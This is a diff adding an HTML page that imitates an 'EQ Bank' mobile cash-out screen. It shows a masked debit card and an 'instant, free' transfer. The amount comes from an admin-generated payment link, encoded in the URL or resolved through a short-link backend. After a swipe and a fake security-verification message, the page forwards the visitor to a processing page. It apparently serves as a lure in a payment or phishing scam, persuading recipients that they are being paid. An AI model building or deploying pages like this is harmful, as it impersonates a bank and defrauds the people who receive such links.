@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#131921">
+<title>Cash out · EQ Bank</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --amz-ink: #131921;
+    --amz-ink-mid: #232F3E;
+    --amz-orange: #FF861F;
+    --amz-orange-hover: #F07800;
+    --amz-orange-subtle: #FFF4E5;
+    --amz-text: #0F1111;
+    --amz-muted: #565959;
+    --amz-border: #E7E9EC;
+    --amz-border-soft: #F0F1F3;
+    --amz-success: #067D62;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #EEF0F2;
+    color: var(--amz-text);
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.4;
+    min-height: 100dvh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .phone {
+    width: 100%;
+    max-width: 400px;
+    background: #FFFFFF;
+    height: 100dvh;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+  @media (min-width: 520px) {
+    body { padding: 20px 0; }
+    .phone {
+      height: calc(100dvh - 40px);
+      max-height: 760px;
+      border-radius: 22px;
+      box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
+    }
+  }
+
+  .app-header {
+    background: var(--amz-ink);
+    color: #fff;
+    height: 68px;
+    padding: 0 14px;
+    padding-top: env(safe-area-inset-top, 0);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    flex-shrink: 0;
+    z-index: 5;
+  }
+  .app-header .back {
+    width: 34px; height: 34px;
+    border-radius: 50%;
+    border: none;
+    background: transparent;
+    color: #fff;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    margin-left: -4px;
+    transition: background .15s;
+  }
+  .app-header .back:hover { background: rgba(255,255,255,0.08); }
+  .app-header .back svg { width: 19px; height: 19px; }
+  .app-header .title {
+    position: absolute;
+    left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 21px;
+    font-weight: 600;
+    letter-spacing: -0.3px;
+    white-space: nowrap;
+  }
+  .app-header .spacer-right { width: 34px; height: 34px; }
+
+  .body-scroll {
+    flex: 1 1 auto;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    padding-bottom: 96px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .amount-section {
+    padding: 22px 18px 16px;
+    text-align: center;
+    border-bottom: 1px solid var(--amz-border-soft);
+  }
+  .amount-value {
+    font-size: 46px;
+    font-weight: 800;
+    letter-spacing: -1.6px;
+    line-height: 1.05;
+    color: var(--amz-ink);
+    word-break: break-word;
+  }
+  .amount-value .cur {
+    font-size: 21px;
+    font-weight: 700;
+    letter-spacing: -0.4px;
+    margin-right: 3px;
+  }
+  .amount-value .dec {
+    font-size: 30px;
+    font-weight: 700;
+    letter-spacing: -0.8px;
+  }
+  @media (max-width: 360px) {
+    .amount-value { font-size: 40px; letter-spacing: -1.2px; }
+    .amount-value .cur { font-size: 18px; }
+    .amount-value .dec { font-size: 26px; }
+  }
+
+  .row-block {
+    padding: 11px 18px;
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    border-bottom: 1px solid var(--amz-border-soft);
+  }
+  .row-block .icon {
+    flex: 0 0 24px; height: 24px;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink);
+  }
+  .row-block .icon svg { width: 100%; height: 100%; }
+  .row-block .row-text {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--amz-ink);
+    letter-spacing: -0.15px;
+  }
+  .row-block .row-text .masked { font-weight: 700; }
+
+  .speed-block {
+    padding: 10px 18px 9px;
+    border-bottom: 1px solid var(--amz-border-soft);
+  }
+  .speed-line {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--amz-ink);
+    letter-spacing: -0.15px;
+  }
+  .speed-line .bolt {
+    flex: 0 0 18px; height: 18px;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink);
+  }
+  .speed-line .bolt svg { width: 100%; height: 100%; }
+  .speed-sub {
+    margin-top: 3px;
+    font-size: 12px;
+    color: var(--amz-muted);
+    line-height: 1.45;
+    padding-left: 27px;
+  }
+
+  .info-block {
+    padding: 12px 18px 4px;
+    font-size: 12px;
+    color: var(--amz-muted);
+    line-height: 1.5;
+  }
+
+  .spacer { flex: 1 1 auto; min-height: 6px; }
+
+  .summary {
+    padding: 0 18px 12px;
+    margin-top: 2px;
+  }
+  .summary-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 0;
+    font-size: 13.5px;
+    color: var(--amz-ink);
+  }
+  .summary-row .k { font-weight: 500; color: var(--amz-muted); }
+  .summary-row .v { font-weight: 600; color: var(--amz-ink); }
+  .summary-row.final { border-top: 1px solid var(--amz-border-soft); }
+  .summary-row.final .k { color: var(--amz-ink); font-weight: 600; }
+  .summary-row.final .v { font-weight: 800; font-size: 15.5px; }
+  .divider { height: 1px; background: var(--amz-border-soft); }
+
+  .confirm-area {
+    position: absolute;
+    left: 0; right: 0; bottom: 0;
+    background: #fff;
+    border-top: 1px solid var(--amz-border);
+    padding: 12px 18px calc(12px + env(safe-area-inset-bottom, 0));
+    z-index: 10;
+  }
+
+  .swipe {
+    position: relative;
+    width: 100%;
+    height: 60px;
+    border-radius: 30px;
+    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 50%, var(--amz-orange-hover) 100%);
+    overflow: hidden;
+    cursor: grab;
+    user-select: none;
+    touch-action: none;
+    box-shadow:
+      0 6px 18px rgba(255,134,31,0.30),
+      inset 0 1px 0 rgba(255,255,255,0.4),
+      inset 0 -2px 0 rgba(0,0,0,0.08);
+    transition: box-shadow .2s;
+    isolation: isolate;
+  }
+  .swipe:active { cursor: grabbing; }
+
+  .swipe::before {
+    content: '';
+    position: absolute;
+    top: 0; bottom: 0;
+    left: -60%;
+    width: 45%;
+    background: linear-gradient(90deg,
+      rgba(255,255,255,0) 0%,
+      rgba(255,255,255,0.28) 50%,
+      rgba(255,255,255,0) 100%);
+    transform: skewX(-18deg);
+    pointer-events: none;
+    animation: shimmer 2.8s ease-in-out infinite;
+    z-index: 1;
+  }
+  @keyframes shimmer {
+    0%   { left: -60%; }
+    55%  { left: 120%; }
+    100% { left: 120%; }
+  }
+
+  .swipe .swipe-fill {
+    position: absolute;
+    top: 0; left: 0; bottom: 0;
+    width: 60px;
+    background: rgba(255,255,255,0.16);
+    border-radius: 30px 0 0 30px;
+    pointer-events: none;
+    z-index: 1;
+  }
+  .swipe .swipe-label {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 0.4px;
+    pointer-events: none;
+    transition: opacity .15s;
+    text-shadow: 0 1px 2px rgba(0,0,0,0.18);
+    z-index: 2;
+    padding-left: 30px;
+    padding-right: 14px;
+  }
+  @media (max-width: 360px) {
+    .swipe .swipe-label { font-size: 13.5px; letter-spacing: 0.3px; }
+  }
+
+  .swipe .knob {
+    position: absolute;
+    top: 5px; left: 5px;
+    width: 50px; height: 50px;
+    border-radius: 50%;
+    background: linear-gradient(180deg, #FFFFFF 0%, #F6F7F8 100%);
+    color: var(--amz-orange);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow:
+      0 3px 10px rgba(0,0,0,0.20),
+      inset 0 -1px 0 rgba(0,0,0,0.05);
+    pointer-events: none;
+    z-index: 3;
+    animation: knobPulse 2.4s ease-in-out infinite;
+  }
+  @keyframes knobPulse {
+    0%, 100% { box-shadow: 0 3px 10px rgba(0,0,0,0.20), 0 0 0 0 rgba(255,255,255,0.55), inset 0 -1px 0 rgba(0,0,0,0.05); }
+    50%      { box-shadow: 0 3px 10px rgba(0,0,0,0.20), 0 0 0 6px rgba(255,255,255,0), inset 0 -1px 0 rgba(0,0,0,0.05); }
+  }
+
+  .swipe .knob svg {
+    width: 19px; height: 19px;
+    animation: chevronNudge 1.6s ease-in-out infinite;
+  }
+  @keyframes chevronNudge {
+    0%, 100% { transform: translateX(0); }
+    50%      { transform: translateX(2px); }
+  }
+
+  .swipe.done { background: linear-gradient(180deg, #08A67E 0%, var(--amz-success) 100%); box-shadow: 0 6px 16px rgba(6,125,98,0.30); }
+  .swipe.done::before { animation: none; opacity: 0; }
+  .swipe.done .knob { color: var(--amz-success); animation: none; }
+  .swipe.done .knob svg { animation: none; }
+
+  .modal-backdrop {
+    position: absolute;
+    inset: 0;
+    background: rgba(19,25,33,0.40);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .2s ease;
+    z-index: 20;
+  }
+  .modal-backdrop.show { opacity: 1; pointer-events: auto; }
+
+  .confirm-modal {
+    position: absolute;
+    left: 50%;
+    bottom: 88px;
+    transform: translate(-50%, 10px) scale(0.96);
+    width: min(310px, calc(100% - 36px));
+    background: #fff;
+    border-radius: 16px;
+    box-shadow: 0 24px 60px rgba(19,25,33,0.30);
+    padding: 20px 18px 16px;
+    text-align: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .2s ease, transform .2s ease;
+    z-index: 30;
+  }
+  .confirm-modal.show {
+    opacity: 1;
+    pointer-events: auto;
+    transform: translate(-50%, 0) scale(1);
+  }
+  .confirm-modal .modal-shield {
+    width: 44px; height: 44px;
+    border-radius: 50%;
+    background: var(--amz-orange-subtle);
+    color: var(--amz-orange-hover);
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 10px;
+  }
+  .confirm-modal .modal-shield svg { width: 22px; height: 22px; }
+  .confirm-modal h3 {
+    font-size: 16px;
+    font-weight: 800;
+    color: var(--amz-ink);
+    letter-spacing: -0.3px;
+    margin-bottom: 5px;
+  }
+  .confirm-modal p {
+    font-size: 12.5px;
+    color: var(--amz-muted);
+    line-height: 1.5;
+    margin-bottom: 8px;
+  }
+  .confirm-modal .amt {
+    display: block;
+    font-size: 22px;
+    font-weight: 800;
+    color: var(--amz-ink);
+    letter-spacing: -0.5px;
+    margin: 4px 0 8px;
+  }
+  .confirm-modal .verify-note {
+    font-size: 11px;
+    color: var(--amz-muted);
+    background: #F7F8FA;
+    border: 1px solid var(--amz-border-soft);
+    border-radius: 8px;
+    padding: 8px 10px;
+    line-height: 1.45;
+    margin-bottom: 14px;
+    text-align: left;
+    display: flex;
+    gap: 7px;
+    align-items: flex-start;
+  }
+  .confirm-modal .verify-note svg {
+    flex: 0 0 14px; height: 14px;
+    margin-top: 1px;
+    color: var(--amz-success);
+  }
+  .modal-actions {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 9px;
+  }
+  .btn {
+    padding: 11px 10px;
+    border: none;
+    border-radius: 9px;
+    font-family: inherit;
+    font-size: 13.5px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: filter .15s, transform .1s, background .15s;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn-no { background: #F0F1F3; color: var(--amz-ink); }
+  .btn-no:hover { background: #E7E9EC; }
+  .btn-yes { background: var(--amz-orange); color: #fff; }
+  .btn-yes:hover { filter: brightness(1.06); }
+
+  .loading-overlay {
+    position: fixed;
+    inset: 0;
+    background: var(--amz-ink);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 18px;
+    z-index: 100;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .25s ease;
+  }
+  .loading-overlay.show { opacity: 1; pointer-events: auto; }
+  .loading-overlay .brand-mark {
+    width: 58px; height: 58px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink);
+    font-weight: 800;
+    font-size: 22px;
+    letter-spacing: -0.5px;
+    box-shadow: 0 6px 24px rgba(255,134,31,0.35);
+  }
+  .loading-overlay .load-title { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; }
+  .loading-overlay .load-sub { font-size: 12.5px; color: rgba(255,255,255,0.65); margin-top: -10px; }
+  .spinner {
+    width: 28px; height: 28px;
+    border: 3px solid rgba(255,255,255,0.18);
+    border-top-color: var(--amz-orange);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .state-card { padding: 46px 24px; text-align: center; }
+  .state-card .ic {
+    width: 54px; height: 54px;
+    border-radius: 50%;
+    background: var(--amz-orange-subtle);
+    color: var(--amz-orange-hover);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 24px;
+    margin: 0 auto 16px;
+  }
+  .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
+  .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
+</style>
+</head>
+<body>
+
+<div class="phone" id="phone">
+
+  <header class="app-header">
+    <button class="back" id="backBtn" aria-label="Back">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+    </button>
+    <div class="title">Cash out</div>
+    <span class="spacer-right"></span>
+  </header>
+
+  <div class="body-scroll" id="bodyScroll">
+
+    <section class="amount-section">
+      <div class="amount-value" id="amountDisplay">
+        <span class="cur" id="curSymbol">$</span><span id="amtInt">0</span><span class="dec" id="amtDec">.00</span>
+      </div>
+    </section>
+
+    <div class="row-block">
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2.5" y="6" width="19" height="13" rx="2.5"/>
+          <path d="M2.5 10.5h19"/>
+          <path d="M6.5 15h4"/>
+        </svg>
+      </div>
+      <div class="row-text">
+        EQ Bank Debit Card <span class="masked">*3657</span>
+      </div>
+    </div>
+
+    <div class="speed-block">
+      <div class="speed-line">
+        <span class="bolt">
+          <svg viewBox="0 0 24 24" fill="currentColor">
+            <path d="M13 2L4.5 13.5h6L10 22l8.5-11.5h-6L13 2z"/>
+          </svg>
+        </span>
+        <span>Instant – free</span>
+      </div>
+      <div class="speed-sub">Funds will typically be available to you within 5 minutes.</div>
+    </div>
+
+    <div class="info-block">
+      The funds will be processed according to the payment details provided. Bank may take up to 24 hours to process the payment.
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="summary">
+      <div class="summary-row">
+        <span class="k">Transaction fee</span>
+        <span class="v" id="feeDisplay">$0.00</span>
+      </div>
+      <div class="divider"></div>
+      <div class="summary-row final">
+        <span class="k">You receive</span>
+        <span class="v" id="receiveDisplay">$0.00</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="confirm-area">
+    <div class="swipe" id="swipe">
+      <div class="swipe-fill" id="swipeFill"></div>
+      <div class="swipe-label" id="swipeLabel">Swipe to confirm cash out</div>
+      <div class="knob" id="knob">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 6l6 6-6 6"/>
+          <path d="M15 6l6 6-6 6" opacity="0.45"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-backdrop" id="modalBackdrop"></div>
+  <div class="confirm-modal" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
+    <div class="modal-shield">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+        <path d="M9 12l2 2 4-4"/>
+      </svg>
+    </div>
+    <h3 id="confirmTitle">Are you sure?</h3>
+    <p>You are about to receive</p>
+    <span class="amt" id="modalAmount">$0.00</span>
+    <div class="verify-note">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+        <path d="M9 12l2 2 4-4"/>
+      </svg>
+      <span>For your security, this request will be verified before funds are released.</span>
+    </div>
+    <div class="modal-actions">
+      <button class="btn btn-no" id="modalNo">No</button>
+      <button class="btn btn-yes" id="modalYes">Yes</button>
+    </div>
+  </div>
+
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="brand-mark">EQ</div>
+  <div class="load-title">Cash out · EQ Bank</div>
+  <div class="load-sub">Verifying your request…</div>
+  <div class="spinner"></div>
+</div>
+
+<script>
+const API_BASE = 'https://mobile-eq-banking-production.up.railway.app';
+
+const CONFIG = {
+  NEXT_PAGE: 'processing.html',
+  LOADING_MS: 1500,
+  SHORT_LINK_ENDPOINTS: [
+    (code) => API_BASE + '/api/links/' + encodeURIComponent(code),
+    (code) => API_BASE + '/api/links?code=' + encodeURIComponent(code)
+  ],
+  /* Transaction fee = 2.5% of the amount received.
+     If the admin payload includes an explicit `fee`, that overrides. */
+  FEE_RATE: 0.025
+};
+
+const CURRENCY_SYMBOLS = {
+  USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
+  MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
+  UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
+};
+function currencySymbol(code) {
+  const c = String(code || 'USD').toUpperCase();
+  return CURRENCY_SYMBOLS[c] || (c + ' ');
+}
+function splitAmount(amountStr) {
+  const n = Number(amountStr);
+  if (!isFinite(n)) return { int: '0', dec: '.00' };
+  const [int, dec] = n.toFixed(2).split('.');
+  return { int, dec: '.' + dec };
+}
+function formatMoney(amount, currency) {
+  const n = Number(amount);
+  const safe = isFinite(n) ? n : 0;
+  return currencySymbol(currency) + safe.toFixed(2);
+}
+
+function b64urlDecode(str) {
+  str = String(str).replace(/-/g, '+').replace(/_/g, '/');
+  while (str.length % 4) str += '=';
+  return decodeURIComponent(escape(atob(str)));
+}
+function readQuery(name) {
+  return new URLSearchParams(window.location.search).get(name);
+}
+
+async function resolvePayload() {
+  const pathMatch = window.location.pathname.match(/^\/([A-Z0-9]{6,12})$/);
+  if (pathMatch) {
+    const code = pathMatch[1];
+    for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
+      try {
+        const res = await fetch(makeUrl(code));
+        if (!res.ok) continue;
+        const data = await res.json();
+        const payload = data && (data.payload || data);
+        if (payload && (payload.am || payload.c)) return payload;
+      } catch (e) {}
+    }
+  }
+
+  const d = readQuery('d');
+  if (d) {
+    try { return JSON.parse(b64urlDecode(d)); }
+    catch (e) { throw new Error('Invalid link data.'); }
+  }
+
+  const code = readQuery('r');
+  if (code) {
+    for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
+      try {
+        const res = await fetch(makeUrl(code));
+        if (!res.ok) continue;
+        const data = await res.json();
+        const payload = data && (data.payload || data);
+        if (payload && (payload.am || payload.c)) return payload;
+      } catch (e) {}
+    }
+    throw new Error('This payment link could not be loaded.');
+  }
+
+  try {
+    const raw = sessionStorage.getItem('amz_payload');
+    if (raw) return JSON.parse(raw);
+  } catch (e) {}
+
+  throw new Error('No payment data found in this link.');
+}
+
+const state = {
+  payload: null, amount: 0, fee: 0, receive: 0,
+  currency: 'USD', swipeDone: false
+};
+
+function computeFeeAndReceive(amount, explicitFee) {
+  const amt = Number(amount) || 0;
+  if (explicitFee != null && !isNaN(Number(explicitFee))) {
+    const fee = Math.max(0, Number(explicitFee));
+    return { fee: round2(fee), receive: round2(Math.max(0, amt - fee)) };
+  }
+  const rate = CONFIG.FEE_RATE;
+  const receive = amt / (1 + rate);
+  const fee = amt - receive;
+  return { fee: round2(fee), receive: round2(receive) };
+}
+function round2(n) { return Math.round(n * 100) / 100; }
+
+function render(payload) {
+  state.payload = payload;
+  state.currency = String(payload.cur || 'USD').toUpperCase();
+  state.amount = Number(payload.am || 0);
+
+  const { fee, receive } = computeFeeAndReceive(state.amount, payload.fee);
+  state.fee = fee;
+  state.receive = receive;
+
+  const sym = currencySymbol(state.currency);
+  const { int, dec } = splitAmount(state.amount);
+  document.getElementById('curSymbol').textContent = sym;
+  document.getElementById('amtInt').textContent = int;
+  document.getElementById('amtDec').textContent = dec;
+
+  document.getElementById('feeDisplay').textContent = formatMoney(state.fee, state.currency);
+  document.getElementById('receiveDisplay').textContent = formatMoney(state.receive, state.currency);
+  document.getElementById('modalAmount').textContent = formatMoney(state.amount, state.currency);
+}
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+
+function checkExpiry(payload) {
+  if (payload && payload.exp && Date.now() > Number(payload.exp)) {
+    showStateCard('⏱', 'This link has expired',
+      'The payment request is no longer valid. Please ask the sender to generate a new link.');
+    return true;
+  }
+  return false;
+}
+function showStateCard(icon, title, message) {
+  const scroll = document.getElementById('bodyScroll');
+  scroll.innerHTML =
+    '<div class="state-card">' +
+      '<div class="ic">' + escapeHtml(icon) + '</div>' +
+      '<h2>' + escapeHtml(title) + '</h2>' +
+      '<p>' + escapeHtml(message) + '</p>' +
+    '</div>';
+  document.querySelector('.confirm-area').style.display = 'none';
+  const bd = document.getElementById('modalBackdrop');
+  if (bd) bd.remove();
+  const md = document.getElementById('confirmModal');
+  if (md) md.remove();
+}
+
+function initSwipe() {
+  const swipe = document.getElementById('swipe');
+  const knob = document.getElementById('knob');
+  const fill = document.getElementById('swipeFill');
+  const label = document.getElementById('swipeLabel');
+
+  let dragging = false;
+  let startX = 0;
+  let currentX = 0;
+  const knobSize = 50;
+  const pad = 5;
+
+  function maxX() {
+    return swipe.getBoundingClientRect().width - knobSize - pad * 2;
+  }
+  function setPos(x) {
+    currentX = Math.max(0, Math.min(x, maxX()));
+    knob.style.transform = 'translateX(' + currentX + 'px)';
+    fill.style.width = (knobSize + pad * 2 + currentX) + 'px';
+    const ratio = currentX / (maxX() || 1);
+    label.style.opacity = String(Math.max(0, 1 - ratio * 1.6));
+  }
+  function start(clientX) {
+    if (state.swipeDone) return;
+    dragging = true;
+    startX = clientX - currentX;
+    swipe.style.transition = 'none';
+  }
+  function move(clientX) {
+    if (!dragging) return;
+    setPos(clientX - startX);
+  }
+  function end() {
+    if (!dragging) return;
+    dragging = false;
+    const ratio = currentX / (maxX() || 1);
+    if (ratio >= 0.82) completeSwipe();
+    else {
+      swipe.style.transition = 'transform .25s ease';
+      currentX = 0;
+      knob.style.transform = 'translateX(0)';
+      fill.style.width = (knobSize + pad * 2) + 'px';
+      label.style.opacity = '1';
+    }
+  }
+
+  swipe.addEventListener('pointerdown', (e) => {
+    if (state.swipeDone) return;
+    swipe.setPointerCapture(e.pointerId);
+    start(e.clientX);
+  });
+  swipe.addEventListener('pointermove', (e) => { if (dragging) move(e.clientX); });
+  swipe.addEventListener('pointerup', end);
+  swipe.addEventListener('pointercancel', end);
+
+  if (!window.PointerEvent) {
+    swipe.addEventListener('touchstart', (e) => { start(e.touches[0].clientX); }, { passive: true });
+    swipe.addEventListener('touchmove', (e) => { move(e.touches[0].clientX); }, { passive: true });
+    swipe.addEventListener('touchend', end);
+  }
+
+  swipe.setAttribute('tabindex', '0');
+  swipe.setAttribute('role', 'button');
+  swipe.addEventListener('keydown', (e) => {
+    if ((e.key === 'Enter' || e.key === ' ') && !state.swipeDone) {
+      e.preventDefault();
+      completeSwipe();
+    }
+  });
+
+  function completeSwipe() {
+    state.swipeDone = true;
+    swipe.classList.add('done');
+    swipe.style.transition = 'transform .2s ease';
+    setPos(maxX());
+    label.textContent = 'Confirmed';
+    label.style.opacity = '1';
+    openModal();
+  }
+}
+
+function openModal() {
+  document.getElementById('modalBackdrop').classList.add('show');
+  document.getElementById('confirmModal').classList.add('show');
+}
+function closeModal() {
+  document.getElementById('modalBackdrop').classList.remove('show');
+  document.getElementById('confirmModal').classList.remove('show');
+}
+function resetSwipe() {
+  state.swipeDone = false;
+  const swipe = document.getElementById('swipe');
+  const knob = document.getElementById('knob');
+  const fill = document.getElementById('swipeFill');
+  const label = document.getElementById('swipeLabel');
+  swipe.classList.remove('done');
+  knob.style.transform = 'translateX(0)';
+  fill.style.width = '60px';
+  label.textContent = 'Swipe to confirm cash out';
+  label.style.opacity = '1';
+}
+
+function proceed() {
+  closeModal();
+  document.getElementById('loadingOverlay').classList.add('show');
+
+  const enriched = Object.assign({}, state.payload, {
+    fee: state.fee.toFixed(2),
+    receive: state.receive.toFixed(2)
+  });
+  try { sessionStorage.setItem('amz_payload', JSON.stringify(enriched)); } catch (e) {}
+
+  const qs = window.location.search || '';
+  setTimeout(() => { window.location.href = CONFIG.NEXT_PAGE + qs; }, CONFIG.LOADING_MS);
+}
+
+function initBack() {
+  document.getElementById('backBtn').addEventListener('click', () => {
+    if (window.history.length > 1) window.history.back();
+  });
+}
+
+async function boot() {
+  initBack();
+  try {
+    const payload = await resolvePayload();
+    if (checkExpiry(payload)) return;
+    render(payload);
+    initSwipe();
+  } catch (err) {
+    showStateCard('⚠', 'Payment link unavailable',
+      err.message || 'Please ask the sender for a new link.');
+  }
+
+  document.getElementById('modalNo').addEventListener('click', () => { closeModal(); resetSwipe(); });
+  document.getElementById('modalYes').addEventListener('click', proceed);
+  document.getElementById('modalBackdrop').addEventListener('click', () => { closeModal(); resetSwipe(); });
+}
+
+document.addEventListener('DOMContentLoaded', boot);
+</script>
+</body>
+</html>
